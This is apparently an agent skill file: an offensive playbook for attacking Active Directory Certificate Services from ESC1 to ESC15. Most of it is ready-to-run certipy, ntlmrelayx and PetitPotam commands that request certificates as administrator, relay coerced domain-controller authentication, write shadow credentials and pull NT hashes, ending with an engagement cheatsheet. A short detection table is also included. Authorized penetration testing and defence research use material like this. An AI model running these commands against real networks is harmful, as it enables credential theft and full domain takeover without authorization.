---
name: offensive-adcs
description: "Active Directory Certificate Services attack methodology — ESC1 through ESC15 misconfigurations, certipy enumeration and exploitation, certificate-to-NT-hash via UnPAC-the-Hash, NTLM relay to ADCS Web Enrollment (ESC8), Shadow Credentials (msDS-KeyCredentialLink) for password-less authentication, and CA compromise paths. Use when AD CS is in scope — virtually every modern AD environment runs an internal CA, and ADCS misconfigurations frequently provide the most direct path to Domain Admin."
---

# AD CS / ADCS Abuse (ESC1–ESC15)

The Certified Pre-Owned research from SpecterOps catalogued a comprehensive set of ADCS misconfigurations. Each "ESC#" gives a specific path from any-domain-user to Domain Admin via certificate issuance.

## Quick Workflow

1. Enumerate templates and CAs with `certipy find`
2. Identify vulnerable templates / CA configs
3. Request a malicious cert
4. Authenticate with the cert; convert to NT hash via UnPAC-the-Hash
5. Pivot via the obtained credentials

---

## Enumeration

```bash
# Discover all CAs and templates; flag vulnerable
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable -stdout

# Output JSON
certipy find -u user@corp.local -p pass -dc-ip 10.0.0.1 -vulnerable -json
```

## ESC Reference

| ESC | Misconfig | Exploitation |
|---|---|---|
| ESC1 | Client Auth EKU + ENROLLEE_SUPPLIES_SUBJECT | Request cert with arbitrary UPN/SAN |
| ESC2 | Any Purpose EKU on template | Cert valid for arbitrary purposes |
| ESC3 | Enrollment Agent EKU | Request agent cert, then cert on-behalf-of any user |
| ESC4 | Vulnerable template ACL (write) | Modify template to ESC1 |
| ESC5 | Vulnerable PKI object ACL | Modify CA / template / OU |
| ESC6 | EDITF_ATTRIBUTESUBJECTALTNAME2 on CA | SAN injection on any template |
| ESC7 | Vulnerable CA ACL (ManageCA) | Approve own pending requests |
| ESC8 | Web Enrollment HTTP + no EPA | NTLM relay → cert |
| ESC9 | No security extension + UPN | UPN spoofing post-account-rename |
| ESC10 | StrongCertificateBindingEnforcement weak | UPN spoofing without rename |
| ESC11 | RPC unprotected (no IF_ENFORCEENCRYPTICERTREQUEST) | Relay over RPC |
| ESC13 | Issuance policy linked to group | Cert grants group membership |
| ESC14 | altSecurityIdentities write | Map attacker cert to admin user |
| ESC15 | EKUwu — schema v1 templates | Inject EKU at request time |

## ESC1 (Most Common)

```bash
# Request cert as Administrator (template allows ENROLLEE_SUPPLIES_SUBJECT)
certipy req -u user@corp.local -p pass -ca CORP-CA \
  -template VulnTemplate -upn administrator@corp.local

# Use cert to mint TGT and recover NT hash
certipy auth -pfx administrator.pfx -dc-ip 10.0.0.1
# Output: NT hash for administrator
```

## ESC8 (Coercion + Relay)

```bash
# 1. Set up relay listener
sudo impacket-ntlmrelayx -t http://ca/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support &

# 2. Coerce a DC
PetitPotam.py attacker-ip dc.corp.local

# 3. Cert issued for DC$
# 4. UnPAC-the-Hash → DC NT hash → DCSync
certipy auth -pfx dc.pfx -dc-ip dc
```

## ESC4 (Modify Template)

```bash
# Change vulnerable template to enable ESC1
certipy template -u attacker -p pass -template TargetTemplate -save-old
# Modifies: enrollee-supplies-subject, requires-manager-approval=False
# Then exploit as ESC1
```

## ESC6 (SAN Injection)

```bash
# CA has EDITF_ATTRIBUTESUBJECTALTNAME2 set
certipy req -u user -p pass -ca CORP-CA -template Generic \
  -upn administrator@corp.local
# CA accepts SAN-controlled UPN regardless of template
```

## ESC7 (CA ACL: ManageCA)

```bash
# Pending request approval
certipy ca -u attacker -p pass -ca CORP-CA \
  -issue-request <request-id>
```

## Shadow Credentials (msDS-KeyCredentialLink)

When you have GenericWrite on a victim user, write a key credential to authenticate as them:

```bash
certipy shadow auto -u attacker -p pass -account victim
# Output: NT hash for victim
```

Modern, MDI-quieter alternative to password reset.

## UnPAC-the-Hash

After successful certificate authentication, the PAC contains the NT hash. certipy extracts:

```bash
certipy auth -pfx user.pfx -dc-ip dc
# Output:
# Got TGT
# Saved credential cache to user.ccache
# Got hash for user@corp.local: aad3b435...:abcdef...
```

## Detection

| Signal | Defender View |
|---|---|
| Cert issuance for non-standard UPN | ADCS audit |
| Coerce + ADCS relay pattern | MDI / ADCS combined detection |
| AltSecurityIdentities modification | LDAP audit |
| Pending request approval pattern | ADCS audit |

ADCS audit logging is often weaker than DC logging. Many enterprises don't ship ADCS logs to SIEM by default.

## Engagement Cheatsheet

```bash
# 1. Enum
certipy find -u user@corp.local -p pass -dc-ip dc -vulnerable -stdout

# 2. Pick highest-impact ESC available
# ESC1, ESC8 are most common; ESC3 / ESC11 also common

# 3. Exploit
certipy req -u user -p pass -ca <CA> -template <T> -upn administrator@corp.local
certipy auth -pfx administrator.pfx -dc-ip dc

# 4. Document: ESC, template, CA, target user, NT hash retrieved
```

## Key References

- "Certified Pre-Owned" (Schroeder, Christensen — SpecterOps)
- Certipy: github.com/ly4k/Certipy
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/adcs.md
